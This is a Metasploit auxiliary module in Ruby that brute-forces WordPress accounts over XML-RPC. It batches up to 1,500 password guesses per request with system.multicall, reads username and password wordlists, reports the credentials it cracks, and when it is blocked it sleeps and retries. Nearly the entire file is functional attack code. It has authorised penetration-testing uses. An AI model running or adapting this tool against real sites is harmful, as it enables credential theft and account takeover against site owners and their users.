##
# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
              info,
              'Name'            => 'Massive WordPress bruteforce via XMLRPC',
              'Description'     => %q{Wordpress massive burteforce attack via wordpress XMLRPC service.},
              'License'         => MSF_LICENSE,
              'Author'          =>
                  [
                      'Sabri (@KINGSABRI)',           # MSF module
                      'William (WCoppola@Lares.com)'  # Requester
                  ],
              'References'      =>
                  [
                      ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/'],
                      ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html']
                  ],
              'DisclosureDate'  => '2015'
          ))

    register_options(
        [
            OptPath.new('WPUSER_FILE', [true, 'File containing usernames, one per line',
                                        File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
            OptPath.new('WPPASS_FILE',  [ true, 'File containing passwords, one per line',
                                        File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")])
        ], self.class)


    register_advanced_options(
        [
            OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
            OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5])
        ], self.class)
  end

  def usernames
    File.readlines(datastore['WPUSER_FILE']).map {|user| user.chomp}
  end

  def passwords
    File.readlines(datastore['WPPASS_FILE']).map {|pass| pass.chomp}
  end

  def generate_xml user

    print_warning('Generating XMLs may take a while depends on the list file(s) size.') if passwords.size > 1500
    xml_payloads = []                          # Container for all generated XMLs
    xml = ''
    # Evil XML | Limit number of log-ins to 1500/request for wordpress limitation
    passwords.each_slice(1500) do |pass_group|

      xml =  "<?xml version=\"1.0\"?>\n"
      xml << "<methodCall>\n"
      xml << "<methodName>system.multicall</methodName>\n"
      xml << "<params>\n"
      xml << " <param><value><array><data>\n"
      pass_group.each  do |pass|

        xml << "  <value><struct>\n"
        xml << "  <member>\n"
        xml << "    <name>methodName</name>\n"
        xml << "    <value><string>wp.getUsersBlogs</string></value>\n"
        xml << "  </member>\n"
        xml << "  <member>\n"
        xml << "    <name>params</name><value><array><data>\n"
        xml << "     <value><array><data>\n"
        xml << "      <value><string>#{user}</string></value>\n"
        xml << "      <value><string>#{pass}</string></value>\n"
        xml << "     </data></array></value>\n"
        xml << "    </data></array></value>\n"
        xml << "  </member>\n"
        xml << "  </struct></value>\n"

      end
      xml << " </data></array></value></param>\n"
      xml << "</params>\n"
      xml << "</methodCall>"

      xml_payloads << xml
    end

    print_status('Generating XMLs just done.')
    return xml_payloads
  end

  #
  # Check target status
  #
  def check_wpstatus
    print_status("Checking #{peer} status!")

    case
      when !wordpress_and_online?
        print_error("#{rhost}:#{rport}#{target_uri} does not appear to be running WordPress or you got blocked!")
        :abort
      when !wordpress_xmlrpc_enabled?
        print_error("#{rhost}:#{rport}#{target_uri} does not enable XMLRPC")
        :abort
      else
        print_status("Target #{peer} is running Wordpress")
    end
  end

  def parse_response(res)
    resp.scan(/Incorrect username or password/)
  end

  def run
    check_wpstatus

    usernames.each do |user|
      passfound = false

      print_status("Bruteforcing user: #{user}")
      generate_xml(user).each do |xml|
        break if passfound == true

        opts =
            {
                'method'  => 'POST',
                'uri'     => wordpress_url_xmlrpc,
                'data'    => xml,
                'ctype'   =>'text/xml'
            }

        client = Rex::Proto::Http::Client.new(rhost)
        client.connect
        request  = client.request_cgi(opts)
        response = client.send_recv(request)

        # Request Parser
        req_xml = Nokogiri::Slop xml
        # Response Parser
        res_xml = Nokogiri::Slop response.to_s.scan(/<.*>/).join

        begin
          res_xml.document.methodResponse.params.param.value.array.data.value.each_with_index do |value, i|
            begin
              # If this gives exception then its the correct password
              value.struct.member[1].value.string.text
            rescue
              user = req_xml.document.methodCall.params.param.value.array.data.value[i].struct.member[1].value.array.data.value.array.data.value[0].text
              pass = req_xml.document.methodCall.params.param.value.array.data.value[i].struct.member[1].value.array.data.value.array.data.value[1].text

              print_good("Credentials Found!  #{user}:#{pass}")
              passfound = true
            end end
        rescue NoMethodError
          print_error("It seems you got blocked!")
          print_warning("I'll sleep for 6 minutes then I'll try again. CTR+C to exit")
          sleep 6 * 60
          retry
          # return :abort
        end
        print_status('Taking a nap for 2 seconds..')
        sleep 2
      end end end

end

